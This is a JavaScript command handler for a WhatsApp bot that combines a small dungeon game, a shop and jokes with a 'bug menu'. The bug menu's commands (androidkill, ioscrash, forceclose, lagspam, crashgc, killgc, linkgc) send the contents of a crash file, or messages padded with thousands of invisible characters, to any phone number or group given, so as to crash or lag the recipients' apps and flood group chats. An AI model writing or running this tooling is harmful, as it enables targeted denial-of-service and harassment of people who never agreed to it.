const fs = require('fs');
const path = require('path');
const { isFlooding, isOnCooldown } = require('../lib/antiFlood');

let users = JSON.parse(fs.readFileSync('./data/users.json'));
let shop = JSON.parse(fs.readFileSync('./data/shop.json'));

function saveUserData() {
  fs.writeFileSync('./data/users.json', JSON.stringify(users, null, 2));
}

global.antibugOn = true;
global.mirrorMode = false;
global.mirrorTarget = null;

module.exports = async function handleCommand(sock, m, msgText, sender, reply) {
  const from = m.key.remoteJid;
  const args = msgText.trim().split(' ');
  const command = args[0].startsWith('.') ? args[0].slice(1).toLowerCase() : args[0].toLowerCase();

  // Anti-bug protection
  if (global.antibugOn && m.message?.conversation) {
    const crashPattern = /[\u200B-\u200D\uFEFF\u2060]{100,}/;
    if (crashPattern.test(m.message.conversation)) {
      await sock.sendMessage(from, { text: '🛡️ AntiBug triggered.' });
      return;
    }
  }

  // Mirror mode
  if (global.mirrorMode && sender === global.mirrorTarget && m.message?.conversation) {
    await sock.sendMessage(from, { text: m.message.conversation });
  }

  // Anti-spam/flood
  if (isOnCooldown(sender)) {
    return reply('⏳ Please wait before using another command.');
  }
  if (isFlooding(sender)) {
    return reply('🚫 Flood detected. Slow down.');
  }

  if (!users[sender]) {
    users[sender] = { level: 1, hp: 100, inventory: [], alive: true };
    saveUserData();
  }

  const user = users[sender];

  switch (command) {
    case 'menu':
      reply(`📜 *Menu*\n.bugmenu\n.fight\n.shop\n.inventory\n.buy <item>\n.heal\n.revive\n.joke\n.quote\n.love\n.antibug on/off`);
      break;

    case 'bugmenu':
      reply(`🧨 *Bug Menu:*\n.fakecrash\n.invisiblecrash\n.androidkill <number>\n.ioscrash <number>\n.forceclose <number>\n.lagspam <number>\n.crashgc\n.killgc\n.linkgc`);
      break;

    case 'joke':
      reply('😂 Why do programmers hate nature? It has too many bugs.');
      break;

    case 'quote':
      reply('💬 "Talk is cheap. Show me the code." – Linus Torvalds');
      break;

    case 'love':
      reply('❤️ You + Me = <3');
      break;

    case 'fakecrash':
      try {
        const crash = fs.readFileSync('./media/crash.txt', 'utf-8');
        await sock.sendMessage(from, { text: crash }, { quoted: m });
      } catch {
        reply('⚠️ crash.txt not found in ./media');
      }
      break;

    case 'invisiblecrash':
      await sock.sendMessage(from, { text: '‎'.repeat(3000) });
      break;

    case 'androidkill':
    case 'ioscrash':
      const target = args[1];
      if (!target) return reply('Usage: .androidkill <number>');
      for (let i = 0; i < 3; i++) {
        await sock.sendMessage(`${target}@s.whatsapp.net`, { text: '‎'.repeat(2000) });
      }
      reply(`💥 Sent to ${target}`);
      break;

    case 'forceclose':
      const target2 = args[1];
      if (!target2) return reply('Usage: .forceclose <number>');
      try {
        const crash = fs.readFileSync('./media/crash.txt', 'utf-8');
        await sock.sendMessage(`${target2}@s.whatsapp.net`, { text: crash });
        reply(`☠️ Sent force crash to ${target2}`);
      } catch {
        reply('⚠️ crash.txt missing');
      }
      break;

    case 'lagspam':
      const spamTarget = args[1];
      if (!spamTarget) return reply('Usage: .lagspam <number>');
      for (let i = 0; i < 4; i++) {
        await sock.sendMessage(`${spamTarget}@s.whatsapp.net`, { text: '‎'.repeat(1500) });
      }
      reply(`📡 Lagspam sent to ${spamTarget}`);
      break;

    case 'crashgc':
    case 'killgc':
      if (!m.key.remoteJid.endsWith('@g.us')) return reply('⚠️ Group only.');
      await sock.sendMessage(from, { text: '‎'.repeat(3000) });
      reply('💣 Group crash attempt sent.');
      break;

    case 'linkgc':
      if (!m.key.remoteJid.endsWith('@g.us')) return reply('⚠️ Group only.');
      const code = await sock.groupInviteCode(from);
      await sock.sendMessage(from, { text: `https://chat.whatsapp.com/${code}\n‎`.repeat(2500) });
      break;

    case 'antibug':
      const toggle = args[1];
      if (toggle === 'on') {
        global.antibugOn = true;
        reply('✅ AntiBug enabled.');
      } else if (toggle === 'off') {
        global.antibugOn = false;
        reply('❌ AntiBug disabled.');
      } else {
        reply('Usage: .antibug on/off');
      }
      break;

    case 'mirrorchat':
      global.mirrorMode = true;
      global.mirrorTarget = sender;
      reply('🔁 Mirror chat enabled.');
      break;

    case 'stopmirror':
      global.mirrorMode = false;
      global.mirrorTarget = null;
      reply('🛑 Mirror chat disabled.');
      break;

    case 'fight':
      if (!user.alive) return reply('💀 You are dead. Use .revive first.');
      reply('⚔️ Entered dungeon. Use .attack left or .attack right');
      break;

    case 'attack':
      const dir = args[1];
      if (!user.alive) return reply('☠️ You are dead! Use .revive');
      if (!['left', 'right'].includes(dir)) return reply('⚔️ Use .attack left or .attack right');

      const monster = Math.floor(Math.random() * (user.level * 10 + 30));
      const power = Math.floor(Math.random() * (user.level * 15 + 40));

      if (power >= monster) {
        user.level++;
        reply(`🎯 You defeated the monster! Now Level ${user.level}`);
      } else {
        user.hp = 0;
        user.alive = false;
        reply('💀 You were defeated. Use .revive');
      }

      saveUserData();
      break;

    case 'revive':
      if (user.alive) return reply('🧬 You are already alive.');
      user.alive = true;
      user.hp = 100;
      saveUserData();
      reply('✨ You are revived!');
      break;

    case 'heal':
      if (!user.alive) return reply('☠️ Use .revive first.');
      user.hp = 100;
      saveUserData();
      reply('💉 You are fully healed!');
      break;

    case 'shop':
      const list = Object.entries(shop).map(([name, item]) => `🛒 ${name} - ${item.price} coins`).join('\n');
      reply(`🧰 Shop:\n${list}`);
      break;

    case 'buy':
      const itemName = args[1];
      if (!itemName || !shop[itemName]) return reply('❌ Item not found in shop.');
      user.inventory.push(itemName);
      saveUserData();
      reply(`✅ Bought: ${itemName}`);
      break;

    case 'inventory':
      const items = user.inventory.length ? user.inventory.join(', ') : 'Empty';
      reply(`🎒 Inventory: ${items}`);
      break;

    default:
      reply('❓ Unknown command. Use .menu');
  }
};
